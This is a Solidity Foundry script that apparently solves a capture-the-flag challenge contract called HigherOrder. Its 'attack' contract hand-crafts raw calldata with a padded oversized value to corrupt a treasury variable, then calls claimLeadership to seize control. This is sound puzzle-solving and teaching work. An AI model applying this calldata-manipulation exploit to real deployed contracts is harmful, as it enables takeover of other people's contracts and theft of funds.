pragma solidity 0.6.12;

import {Script} from "forge-std/Script.sol";
import {HigherOrder} from "../src/HigherOrder.sol";

/// a piece of cake compared with Switch (￣▽￣) \\\

// for local testing
contract deploy is Script
{
    function run() external
    {
        vm.startBroadcast();

        HigherOrder higherOrder = new HigherOrder();

        vm.stopBroadcast();
    }
}

contract attack is Script
{
    function run() external
    {
        vm.startBroadcast();

        address order; // instance address

        bytes4 registerTreasurySelector = 0x211c85ab;
        bytes2 value = 0xffff; // some value > 255 that fits to uint256
                               // (since treasury is explicitly uint256)
        bytes memory data = abi.encodePacked(
            registerTreasurySelector,
            bytes30(0), // adjusted padding to align with bytes32 (uint256)
            value
        );

        (bool success, ) = order.call(data);
        require(success, "call failed");

        HigherOrder(order).claimLeadership();

        vm.stopBroadcast();
    }
}

